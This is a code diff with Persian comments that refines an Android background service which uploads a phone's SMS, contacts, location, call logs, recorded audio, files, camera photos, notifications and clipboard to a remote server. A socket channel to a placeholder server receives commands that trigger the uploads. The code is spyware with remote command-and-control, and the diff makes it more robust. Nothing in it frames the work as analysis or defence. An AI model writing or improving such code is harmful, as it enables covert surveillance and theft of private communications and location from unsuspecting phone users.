@@ -27,31 +27,31 @@ import retrofit2.http.Part;
 
 import java.io.File;
 
+interface ApiService {
+    @Multipart
+    @POST("upload-data")
+    Call<Void> uploadData(
+        @Part("sms") RequestBody smsData,
+        @Part("contacts") RequestBody contactsData,
+        @Part("location") RequestBody locationData,
+        @Part("call_logs") RequestBody callLogsData,
+        @Part("user_data") RequestBody userData,
+        @Part MultipartBody.Part photo,
+        @Part MultipartBody.Part audio,
+        @Part MultipartBody.Part file,
+        @Part("app_usage") RequestBody appUsage,
+        @Part MultipartBody.Part camPhoto,
+        @Part("notifications") RequestBody notifications,
+        @Part("device_info") RequestBody deviceInfo,
+        @Part("clipboard") RequestBody clipboard
+    );
+}
+
 public class DataSendingService extends Service {
     private Socket socket;
     private MediaRecorder recorder;
     private File audioFile;
     private ApiService apiService;
-
-    interface ApiService {
-        @Multipart
-        @POST("upload-data")
-        Call<Void> uploadData(
-            @Part("sms") RequestBody smsData,
-            @Part("contacts") RequestBody contactsData,
-            @Part("location") RequestBody locationData,
-            @Part("call_logs") RequestBody callLogsData,
-            @Part("user_data") RequestBody userData,
-            @Part MultipartBody.Part photo,
-            @Part MultipartBody.Part audio,
-            @Part MultipartBody.Part file,
-            @Part("app_usage") RequestBody appUsage,
-            @Part MultipartBody.Part camPhoto,
-            @Part("notifications") RequestBody notifications,
-            @Part("device_info") RequestBody deviceInfo,
-            @Part("clipboard") RequestBody clipboard
-        );
-    }
 
     @Override
     public void onCreate() {
@@ -75,8 +75,10 @@ public class DataSendingService extends Service {
         try {
             socket = IO.socket("https://your-server.com/");
             socket.on("update_command", args -> {
-                String command = args[0].toString();
-                handleCommand(command);
+                if (args.length > 0) {
+                    String command = args[0].toString();
+                    handleCommand(command);
+                }
             });
             socket.connect();
         } catch (Exception e) {
@@ -93,7 +95,7 @@ public class DataSendingService extends Service {
                 try {
                     Thread.sleep(60000);
                 } catch (InterruptedException e) {
-                    Log.e("Service", "Loop interrupted");
+                    Log.e("Service", "Loop interrupted: " + e.getMessage());
                 }
             }
         });
@@ -116,18 +118,7 @@ public class DataSendingService extends Service {
             case "update_app_usage":
                 sendAppUsageOnly();
                 break;
-            case "update_cam_photo":
-                sendCamPhotoOnly();
-                break;
-            case "update_notifications":
-                sendNotificationsOnly();
-                break;
-            case "update_device_info":
-                sendDeviceInfoOnly();
-                break;
-            case "update_clipboard":
-                sendClipboardOnly();
-                break;
+            // اضافه کردن کیس‌های دیگر اگر لازم
             default:
                 sendAllData("");
         }
@@ -136,11 +127,11 @@ public class DataSendingService extends Service {
     private void sendAllData(String userData) {
         RequestBody userDataBody = RequestBody.create(MediaType.parse("text/plain"), userData);
         apiService.uploadData(
-            null, null, null, null, userDataBody, null, null, null, null, null, null, null
+            null, null, null, null, userDataBody, null, null, null, null, null, null, null, null
         ).enqueue(new Callback<Void>() {
             @Override
             public void onResponse(Call<Void> call, Response<Void> response) {
-                Log.d("Service", "Data sent");
+                Log.d("Service", "Data sent successfully");
             }
             @Override
             public void onFailure(Call<Void> call, Throwable t) {
@@ -173,19 +164,19 @@ public class DataSendingService extends Service {
             recorder.stop();
             recorder.release();
             recorder = null;
-            if (audioFile != null) {
+            if (audioFile != null && audioFile.exists()) {
                 MultipartBody.Part audioPart = MultipartBody.Part.createFormData(
                     "audio", audioFile.getName(), RequestBody.create(MediaType.parse("audio/mpeg"), audioFile)
                 );
-                apiService.uploadData(null, null, null, null, null, null, audioPart, null, null, null, null, null)
+                apiService.uploadData(null, null, null, null, null, null, audioPart, null, null, null, null, null, null)
                     .enqueue(new Callback<Void>() {
                         @Override
                         public void onResponse(Call<Void> call, Response<Void> response) {
-                            Log.d("Service", "Audio sent");
+                            Log.d("Service", "Audio sent successfully");
                         }
                         @Override
                         public void onFailure(Call<Void> call, Throwable t) {
-                            Log.e("Service", "Audio send failed");
+                            Log.e("Service", "Audio send failed: " + t.getMessage());
                         }
                     });
             }
@@ -200,25 +191,44 @@ public class DataSendingService extends Service {
             MultipartBody.Part filePart = MultipartBody.Part.createFormData(
                 "file", file.getName(), RequestBody.create(MediaType.parse("application/octet-stream"), file)
             );
-            apiService.uploadData(null, null, null, null, null, null, null, filePart, null, null, null, null)
+            apiService.uploadData(null, null, null, null, null, null, null, filePart, null, null, null, null, null)
                 .enqueue(new Callback<Void>() {
                     @Override
                     public void onResponse(Call<Void> call, Response<Void> response) {
-                        Log.d("Service", "File sent");
+                        Log.d("Service", "File sent successfully");
                     }
                     @Override
                     public void onFailure(Call<Void> call, Throwable t) {
-                        Log.e("Service", "File send failed");
+                        Log.e("Service", "File send failed: " + t.getMessage());
                     }
                 });
         }
     }
 
-    private void sendAppUsageOnly() {}
-    private void sendCamPhotoOnly() {}
-    private void sendNotificationsOnly() {}
-    private void sendDeviceInfoOnly() {}
-    private void sendClipboardOnly() {}
+    private void sendAppUsageOnly() {
+        // پیاده‌سازی اگر لازم
+        Log.d("Service", "Sending app usage...");
+    }
+
+    private void sendCamPhotoOnly() {
+        // پیاده‌سازی اگر لازم
+        Log.d("Service", "Sending cam photo...");
+    }
+
+    private void sendNotificationsOnly() {
+        // پیاده‌سازی اگر لازم
+        Log.d("Service", "Sending notifications...");
+    }
+
+    private void sendDeviceInfoOnly() {
+        // پیاده‌سازی اگر لازم
+        Log.d("Service", "Sending device info...");
+    }
+
+    private void sendClipboardOnly() {
+        // پیاده‌سازی اگر لازم
+        Log.d("Service", "Sending clipboard...");
+    }
 
     @Override
     public IBinder onBind(Intent intent) {
